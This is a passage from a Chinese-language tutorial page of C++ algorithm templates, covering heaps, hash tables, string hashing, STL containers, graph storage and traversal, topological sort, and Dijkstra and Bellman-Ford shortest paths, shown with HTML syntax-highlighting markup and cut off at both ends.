class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// h[N]存储堆中的值, h[1]是堆顶，x的左儿子是2x, 右儿子是2x + 1</span><br><span class="hljs-comment">// ph[k]存储第k个插入的点在堆中的位置</span><br><span class="hljs-comment">// hp[k]存储堆中下标是k的点是第几个插入的</span><br><span class="hljs-keyword">int</span> h[N], ph[N], hp[N], size;<br><br><span class="hljs-comment">// 交换两个点，及其映射关系</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">heap_swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    swap(ph[hp[a]],ph[hp[b]]);<br>    swap(hp[a], hp[b]);<br>    swap(h[a], h[b]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">down</span><span class="hljs-params">(<span class="hljs-keyword">int</span> u)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> t = u;<br>    <span class="hljs-keyword">if</span> (u * <span class="hljs-number">2</span> &lt;= size &amp;&amp; h[u * <span class="hljs-number">2</span>] &lt; h[t]) t = u * <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (u * <span class="hljs-number">2</span> + <span class="hljs-number">1</span> &lt;= size &amp;&amp; h[u * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] &lt; h[t]) t = u * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (u != t)<br>    &#123;<br>        heap_swap(u, t);<br>        down(t);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">up</span><span class="hljs-params">(<span class="hljs-keyword">int</span> u)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (u / <span class="hljs-number">2</span> &amp;&amp; h[u] &lt; h[u / <span class="hljs-number">2</span>])<br>    &#123;<br>        heap_swap(u, u / <span class="hljs-number">2</span>);<br>        u &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// O(n)建堆</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n / <span class="hljs-number">2</span>; i; i -- ) down(i);<br><br></code></pre></div></td></tr></table></figure><h3 id="2-11-一般哈希"><a href="#2-11-一般哈希" class="headerlink" title="2.11 一般哈希"></a>2.11 一般哈希</h3><h4 id="2-11-1-拉链法"><a href="#2-11-1-拉链法" class="headerlink" title="2.11.1 拉链法"></a>2.11.1 拉链法</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> h[N], e[N], ne[N], idx;<br><br><span class="hljs-comment">// 向哈希表中插入一个数</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> k = (x % N + N) % N;<br>    e[idx] = x;<br>    ne[idx] = h[k];<br>    h[k] = idx ++ ;<br>&#125;<br><br><span class="hljs-comment">// 在哈希表中查询某个数是否存在</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> k = (x % N + N) % N;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[k]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>        <span class="hljs-keyword">if</span> (e[i] == x)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h4 id="2-11-2-开放寻址法"><a href="#2-11-2-开放寻址法" class="headerlink" title="2.11.2 开放寻址法"></a>2.11.2 开放寻址法</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> h[N];<br><br><span class="hljs-comment">// 如果x在哈希表中，返回x的下标；如果x不在哈希表中，返回x应该插入的位置</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> t = (x % N + N) % N;<br>    <span class="hljs-keyword">while</span> (h[t] != null &amp;&amp; h[t] != x)<br>    &#123;<br>        t ++ ;<br>        <span class="hljs-keyword">if</span> (t == N) t = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> t;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-12-字符串哈希"><a href="#2-12-字符串哈希" class="headerlink" title="2.12 字符串哈希"></a>2.12 字符串哈希</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">核心思想：将字符串看成P进制数，P的经验值是<span class="hljs-number">131</span>或<span class="hljs-number">13331</span>，取这两个值的冲突概率低<br>小技巧：取模的数用<span class="hljs-number">2</span>^<span class="hljs-number">64</span>，这样直接用<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>存储，溢出的结果就是取模的结果<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> ULL;<br>ULL h[N], p[N]; <span class="hljs-comment">// h[k]存储字符串前k个字母的哈希值, p[k]存储 P^k mod 2^64</span><br><br><span class="hljs-comment">// 初始化</span><br>p[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>&#123;<br>    h[i] = h[i - <span class="hljs-number">1</span>] * P + str[i];<br>    p[i] = p[i - <span class="hljs-number">1</span>] * P;<br>&#125;<br><br><span class="hljs-comment">// 计算子串 str[l ~ r] 的哈希值</span><br><span class="hljs-function">ULL <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> h[r] - h[l - <span class="hljs-number">1</span>] * p[r - l + <span class="hljs-number">1</span>];<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="2-13-STL简介"><a href="#2-13-STL简介" class="headerlink" title="2.13 STL简介"></a>2.13 STL简介</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">vector</span>, 变长数组，倍增的思想<br>    size()  返回元素个数<br>    empty()  返回是否为空<br>    clear()  清空<br>    front()/back()<br>    push_back()/pop_back()<br>    begin()/end()<br>    []<br>    支持比较运算，按字典序<br><br><span class="hljs-built_in">pair</span>&lt;<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>&gt;<br>    first, 第一个元素<br>    second, 第二个元素<br>    支持比较运算，以first为第一关键字，以second为第二关键字（字典序）<br><br><span class="hljs-built_in">string</span>，字符串<br>    size()/length()  返回字符串长度<br>    empty()<br>    clear()<br>    substr(起始下标，(子串长度))  返回子串<br>    c_str()  返回字符串所在字符数组的起始地址<br><br><span class="hljs-built_in">queue</span>, 队列<br>    size()<br>    empty()<br>    push()  向队尾插入一个元素<br>    front()  返回队头元素<br>    back()  返回队尾元素<br>    pop()  弹出队头元素<br><br><span class="hljs-built_in">priority_queue</span>, 优先队列，默认是大根堆<br>    size()<br>    empty()<br>    push()  插入一个元素<br>    top()  返回堆顶元素<br>    pop()  弹出堆顶元素<br>    定义成小根堆的方式：<span class="hljs-built_in">priority_queue</span>&lt;<span class="hljs-keyword">int</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;, greater&lt;<span class="hljs-keyword">int</span>&gt;&gt; q;<br><br><span class="hljs-built_in">stack</span>, 栈<br>    size()<br>    empty()<br>    push()  向栈顶插入一个元素<br>    top()  返回栈顶元素<br>    pop()  弹出栈顶元素<br><br><span class="hljs-built_in">deque</span>, 双端队列<br>    size()<br>    empty()<br>    clear()<br>    front()/back()<br>    push_back()/pop_back()<br>    push_front()/pop_front()<br>    begin()/end()<br>    []<br><br><span class="hljs-built_in">set</span>, <span class="hljs-built_in">map</span>, <span class="hljs-built_in">multiset</span>, <span class="hljs-built_in">multimap</span>, 基于平衡二叉树（红黑树），动态维护有序序列<br>    size()<br>    empty()<br>    clear()<br>    begin()/end()<br>    ++, -- 返回前驱和后继，时间复杂度 O(logn)<br><br>    <span class="hljs-built_in">set</span>/<span class="hljs-built_in">multiset</span><br>        insert()  插入一个数<br>        find()  查找一个数<br>        count()  返回某一个数的个数<br>        erase()<br>            (<span class="hljs-number">1</span>) 输入是一个数x，删除所有<span class="hljs-function">x   <span class="hljs-title">O</span><span class="hljs-params">(k + logn)</span></span><br>            (2) 输入一个迭代器，删除这个迭代器<br>        lower_bound()/upper_bound()<br>            lower_bound(x)  返回大于等于x的最小的数的迭代器<br>            upper_bound(x)  返回大于x的最小的数的迭代器<br>    <span class="hljs-built_in">map</span>/<span class="hljs-built_in">multimap</span><br>        insert()  插入的数是一个<span class="hljs-built_in">pair</span><br>        erase()  输入的参数是<span class="hljs-built_in">pair</span>或者迭代器<br>        find()<br>        []  注意<span class="hljs-built_in">multimap</span>不支持此操作。 时间复杂度是 O(logn)<br>        lower_bound()/upper_bound()<br><br><span class="hljs-built_in">unordered_set</span>, <span class="hljs-built_in">unordered_map</span>, <span class="hljs-built_in">unordered_multiset</span>, <span class="hljs-built_in">unordered_multimap</span>, 哈希表<br>    和上面类似，增删改查的时间复杂度是 O(<span class="hljs-number">1</span>)<br>    不支持 lower_bound()/upper_bound()， 迭代器的++，--<br><br><span class="hljs-built_in">bitset</span>, 圧位<br>    <span class="hljs-built_in">bitset</span>&lt;10000&gt; s;<br>    ~, &amp;, |, ^<br>    &gt;&gt;, &lt;&lt;<br>    ==, !=<br>    []<br><br>    count()  返回有多少个<span class="hljs-number">1</span><br><br>    any()  判断是否至少有一个<span class="hljs-number">1</span><br>    none()  判断是否全为<span class="hljs-number">0</span><br><br>    <span class="hljs-built_in">set</span>()  把所有位置成<span class="hljs-number">1</span><br>    <span class="hljs-built_in">set</span>(k, v)  将第k位变成v<br>    reset()  把所有位变成<span class="hljs-number">0</span><br>    flip()  等价于~<br>    flip(k) 把第k位取反<br><br></code></pre></div></td></tr></table></figure><h2 id="三-搜索与图论"><a href="#三-搜索与图论" class="headerlink" title="三.搜索与图论"></a>三.搜索与图论</h2><h3 id="3-1-树与图的存储"><a href="#3-1-树与图的存储" class="headerlink" title="3.1 树与图的存储"></a>3.1 树与图的存储</h3><p>树是一种特殊的图，与图的存储方式相同。<br>对于无向图中的边ab，存储两条有向边a-&gt;b, b-&gt;a。<br>因此我们可以只考虑有向图的存储。</p><h4 id="3-1-1-邻接矩阵："><a href="#3-1-1-邻接矩阵：" class="headerlink" title="3.1.1 邻接矩阵："></a>3.1.1 邻接矩阵：</h4><p>g[a][b] 存储边a-&gt;b</p><h4 id="3-1-2-邻接表："><a href="#3-1-2-邻接表：" class="headerlink" title="3.1.2 邻接表："></a>3.1.2 邻接表：</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 对于每个点k，开一个单链表，存储k所有可以走到的点。h[k]存储这个单链表的头结点</span><br><span class="hljs-keyword">int</span> h[N], e[N], ne[N], idx;<br><br><span class="hljs-comment">// 添加一条边a-&gt;b</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    e[idx] = b, ne[idx] = h[a], h[a] = idx ++ ;<br>&#125;<br><br><span class="hljs-comment">// 初始化</span><br>idx = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">memset</span>(h, <span class="hljs-number">-1</span>, <span class="hljs-keyword">sizeof</span> h);<br></code></pre></div></td></tr></table></figure><h3 id="3-2-树与图的遍历"><a href="#3-2-树与图的遍历" class="headerlink" title="3.2 树与图的遍历"></a>3.2 树与图的遍历</h3><p>时间复杂度 O(n+m), n 表示点数，m 表示边数。</p><h4 id="3-2-1-深度优先遍历"><a href="#3-2-1-深度优先遍历" class="headerlink" title="3.2.1 深度优先遍历"></a>3.2.1 深度优先遍历</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> u)</span></span><br><span class="hljs-function"></span>&#123;<br>    st[u] = <span class="hljs-literal">true</span>; <span class="hljs-comment">// st[u] 表示点u已经被遍历过</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[u]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>    &#123;<br>        <span class="hljs-keyword">int</span> j = e[i];<br>        <span class="hljs-keyword">if</span> (!st[j]) dfs(j);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="3-2-2-宽度优先遍历"><a href="#3-2-2-宽度优先遍历" class="headerlink" title="3.2.2 宽度优先遍历"></a>3.2.2 宽度优先遍历</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">queue</span>&lt;<span class="hljs-keyword">int</span>&gt; q;<br>st[<span class="hljs-number">1</span>] = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 表示1号点已经被遍历过</span><br>q.push(<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">while</span> (q.size())<br>&#123;<br>    <span class="hljs-keyword">int</span> t = q.front();<br>    q.pop();<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[t]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>    &#123;<br>        <span class="hljs-keyword">int</span> j = e[i];<br>        <span class="hljs-keyword">if</span> (!st[j])<br>        &#123;<br>            st[j] = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 表示点j已经被遍历过</span><br>            q.push(j);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-3-拓扑排序"><a href="#3-3-拓扑排序" class="headerlink" title="3.3 拓扑排序"></a>3.3 拓扑排序</h3><p>时间复杂度 O(n+m), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">topsort</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> hh = <span class="hljs-number">0</span>, tt = <span class="hljs-number">-1</span>;<br><br>    <span class="hljs-comment">// d[i] 存储点i的入度</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>        <span class="hljs-keyword">if</span> (!d[i])<br>            q[ ++ tt] = i;<br><br>    <span class="hljs-keyword">while</span> (hh &lt;= tt)<br>    &#123;<br>        <span class="hljs-keyword">int</span> t = q[hh ++ ];<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[t]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>        &#123;<br>            <span class="hljs-keyword">int</span> j = e[i];<br>            <span class="hljs-keyword">if</span> (-- d[j] == <span class="hljs-number">0</span>)<br>                q[ ++ tt] = j;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果所有点都入队了，说明存在拓扑序列；否则不存在拓扑序列。</span><br>    <span class="hljs-keyword">return</span> tt == n - <span class="hljs-number">1</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-4-Dijkstra算法"><a href="#3-4-Dijkstra算法" class="headerlink" title="3.4 Dijkstra算法"></a>3.4 Dijkstra算法</h3><h4 id="3-4-1-朴素版"><a href="#3-4-1-朴素版" class="headerlink" title="3.4.1 朴素版"></a>3.4.1 朴素版</h4><p>时间复杂是 O(n<sup>2</sup>+m), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> g[N][N];  <span class="hljs-comment">// 存储每条边</span><br><span class="hljs-keyword">int</span> dist[N];  <span class="hljs-comment">// 存储1号点到每个点的最短距离</span><br><span class="hljs-keyword">bool</span> st[N];   <span class="hljs-comment">// 存储每个点的最短路是否已经确定</span><br><br><span class="hljs-comment">// 求1号点到n号点的最短路，如果不存在则返回-1</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dijkstra</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist, <span class="hljs-number">0x3f</span>, <span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n - <span class="hljs-number">1</span>; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">int</span> t = <span class="hljs-number">-1</span>;     <span class="hljs-comment">// 在还未确定最短路的点中，寻找距离最小的点</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ )<br>            <span class="hljs-keyword">if</span> (!st[j] &amp;&amp; (t == <span class="hljs-number">-1</span> || dist[t] &gt; dist[j]))<br>                t = j;<br><br>        <span class="hljs-comment">// 用t更新其他点的距离</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ )<br>            dist[j] = min(dist[j], dist[t] + g[t][j]);<br><br>        st[t] = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (dist[n] == <span class="hljs-number">0x3f3f3f3f</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h4 id="3-4-2-堆优化版"><a href="#3-4-2-堆优化版" class="headerlink" title="3.4.2 堆优化版"></a>3.4.2 堆优化版</h4><p>时间复杂度 O(mlogn), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">pair</span>&lt;<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>&gt; PII;<br><br><span class="hljs-keyword">int</span> n;      <span class="hljs-comment">// 点的数量</span><br><span class="hljs-keyword">int</span> h[N], w[N], e[N], ne[N], idx;       <span class="hljs-comment">// 邻接表存储所有边</span><br><span class="hljs-keyword">int</span> dist[N];        <span class="hljs-comment">// 存储所有点到1号点的距离</span><br><span class="hljs-keyword">bool</span> st[N];     <span class="hljs-comment">// 存储每个点的最短距离是否已确定</span><br><br><span class="hljs-comment">// 求1号点到n号点的最短距离，如果不存在，则返回-1</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dijkstra</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist, <span class="hljs-number">0x3f</span>, <span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">priority_queue</span>&lt;PII, <span class="hljs-built_in">vector</span>&lt;PII&gt;, greater&lt;PII&gt;&gt; heap;<br>    heap.push(&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;);      <span class="hljs-comment">// first存储距离，second存储节点编号</span><br><br>    <span class="hljs-keyword">while</span> (heap.size())<br>    &#123;<br>        <span class="hljs-keyword">auto</span> t = heap.top();<br>        heap.pop();<br><br>        <span class="hljs-keyword">int</span> ver = t.second, distance = t.first;<br><br>        <span class="hljs-keyword">if</span> (st[ver]) <span class="hljs-keyword">continue</span>;<br>        st[ver] = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[ver]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>        &#123;<br>            <span class="hljs-keyword">int</span> j = e[i];<br>            <span class="hljs-keyword">if</span> (dist[j] &gt; distance + w[i])<br>            &#123;<br>                dist[j] = distance + w[i];<br>                heap.push(&#123;dist[j], j&#125;);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (dist[n] == <span class="hljs-number">0x3f3f3f3f</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-5-Bellman-Ford算法"><a href="#3-5-Bellman-Ford算法" class="headerlink" title="3.5 Bellman-Ford算法"></a>3.5 Bellman-Ford算法</h3><p>时间复杂度 O(nm), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n, m;       <span class="hljs-comment">// 